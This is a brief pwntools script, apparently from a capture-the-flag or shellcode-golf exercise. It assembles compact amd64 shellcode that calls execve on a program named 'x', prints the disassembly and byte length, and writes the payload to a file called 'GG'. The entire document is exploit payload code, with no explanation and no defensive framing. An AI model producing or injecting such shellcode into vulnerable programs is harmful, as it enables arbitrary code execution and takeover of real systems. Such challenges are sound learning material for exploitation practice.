from pwn import *

context.arch = 'amd64'

shellcode = asm("""
push 0x78
push rsp
pop rdi
xor esi, esi
cdq
mov al, 0x3b
syscall
""")

print(disasm(shellcode))
print(len(shellcode))
write('GG', shellcode)
